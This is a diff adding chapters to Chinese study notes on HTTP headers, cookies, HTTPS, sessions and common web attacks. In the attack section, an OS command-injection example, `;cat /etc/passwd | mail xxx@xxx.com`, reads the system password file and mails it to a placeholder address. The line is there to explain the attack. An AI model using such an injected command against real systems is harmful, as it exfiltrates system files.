@@ -262,7 +262,7 @@ sequence
 2. 503 Service Unavaliable
     表示服务器暂时处于超负载或者停机维护，无法进行处理请求。
 
-# WEB服务器
+# 第五章 WEB服务器
 1. 代理：
    
     转发功能的应用程序，接收来自客户端发送的请求转发给服务器，同时也接收服务器返回的响应并转发给客户端。
@@ -279,5 +279,115 @@ sequence
 
     按照要求建立起一条与其服务器的通信线路，之后可以使用ssl等加密手段进行通信，可以却把客户端与服务器进行安全的通信。
 
-## 保存资源的缓存
+# 第六章 HTTP首部
 
+报文一般分为 报文首部和报文主体， 请求报文和响应报文的格式有所区别
+1. 请求报文首部为：
+
+    ![avator](images/请求报文首部.jpg)
+
+2. 响应报文首部为：
+
+    ![avator](images/响应报文首部.jpg)
+
+## 首部字段
+首部字段可以提供报文大小，使用的语言，认证信息等内容
+
+结构：  `首部字段名：字段值`
+例如：  `Content-Type: text/html`
+
+
+1. 4中HTTP首部字段类型
+    * 通用首部字段： 请求报文和响应报文都会用的首部
+    * 请求首部字段： 发送请求报文时使用的首部，补充了请求的附加内容，客户端信息等
+    * 响应头部字段： 发送响应报文时使用的首部，补充了响应的附加内容，也会要求客户端附加额外的内容信息。
+    * 实体首部字段： 实体部分使用的字段，补充了资源内容更新的时间等内容
+
+2. HTTP/1.1 常见的通用首部字段：
+   * Cache-Control 控制缓存， `Cache-Control: private, max-age=0, no-cache`
+   * Connection 
+     * 控制不在转发给代理的首部信息，值是一个首部字段，转发时候把这个字段删掉。
+     * 管理持久连接， keep-alive, close
+   * Date: 创建报文的时间
+   * Pragma: 请求中的字段， `Pragma: no-cache` 让所有中间服务器都不返回缓存
+   * Transfer-Encoding: 编码方式
+   * Upgrade, 值是一个和现在不同的通信协议，检测是否可以升级。
+   * Via, 追踪传输路径
+   * Warning 警告
+3. 请求首部字段：
+   * Accept: 可以处理的媒体类型
+   * Accept-Charset: 可接受字符集
+   * Accept-Encoding： 可接受编码方式
+   * Accpet-Language 语言
+   * Authorization 认证信息
+   * From 电子邮件
+   * Host
+   * User-Agent:浏览器和用户代理名称传给服务器
+
+4. 响应首部字段
+   * Age 创建响应了多久
+   * Server: 服务器和版本
+5. 实体首部信息：
+   * Allow， 接收的方法
+   * Content-Enconding
+   * Content-Language
+   * Content-Length
+   * Content-Type
+
+## Cookie首部指端
+1. Set-Cookie
+   `Set-Cookie: status=enable; expires=Tue, 05...;`
+   * NAME=VALUE, cookie的名称 必填
+   * expires=DATE, 有效期
+   * path=PATH,服务器上的文件目录。
+   * domain=域名  一级域名的话，可以对二级域名发送cookie ，  baidu.com是 一级域名， www.baidu.com是二级域名
+   * Secure  仅在HTTPS安全通信下才发送
+   * HttpOnly  加以限制，使Cookie不能被JS脚本访问
+2. Cookie
+   `Cookie: status=enable` 告知服务器，发送请求会包含从服务器接收的Cookie,接收到多个，同样以多个Cookie形式发送。
+
+# 第七章 HTTPS
+1. HTTP缺点：
+   * 通信使用明文，内容可能被窃取抓包
+   * 不验证通信方身份
+   * 无法证明报文的完整性，可能被篡改
+
+2. 加密处理防止被窃听
+   HTTP+SSL(Secure Socket Layer, 安全套接层) 或者 TLS(Transport Layer Security 安全层传输协议)加密HTTP通信内容
+3. HTTP+加密+认证+完整性保护 = HTTPS
+    ![avator](images/HTTPS通信.jpg)
+
+4. SSL公开密钥加密技术
+   
+   ![avator](images/HTTPS加密.jpg)
+
+   1. 下载浏览器时候，浏览器自带了知名的数字认证机构的公钥
+   2. 服务器向数字认证机构申请，把自己的公钥放到证书里。服务器的公钥使用认证机构的私钥进行签名。
+   3. 客户端收到证书后，用认证机构的公钥对证书进行验证，确认证书真实性，服务器公钥的可用性，然后使用公钥加密发送数据给服务器。服务器收到以后用自己的密钥解密。
+   4. 安全之后，可以使用共享密钥交换，之后使用共享密钥加密解密。
+
+# 第八章 认证
+## cookie和Session
+利用cookie技术来管理session，保存用户的状态，具体做法就是：
+* 客户端发送认证信息给服务器
+* 服务器校验，保存登录信息到服务器的记录中，为一条session记录，返回session_id给客户端。
+* 客户再次发送请求时在Cookie中带着sessionId
+
+# 第九章 基于HTTP的功能追加协议
+1. websocket
+   建立连接之后可以直接通信。特点：
+   1. 支持推送
+   2. 减少通信量
+2. HTTP/2.0
+
+# 第11章 web攻击技术
+1. XSS Cross-Site Scripting 跨站脚本攻击：通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签和JS进行攻击。其中包括：
+   1. 反射型： 在url中添加js代码
+   2. 存储型： 将恶意代码提交并保存到服务器，之后别人访问url时会运行代码
+   3. DOM： 
+
+    防御： 对用户输入做转义
+
+2. sql注入： 通过改写sql并提交，修改或者访问数据库数据
+3. os注入： 注入系统命令，比如发送邮件地址的时候，添加 `;cat /etc/passwd | mail xxx@xxx.com`,这时候就会获取到密码并发送
+4. 会话劫持： 攻击者获取到用户的sessionID, 并发送请求。
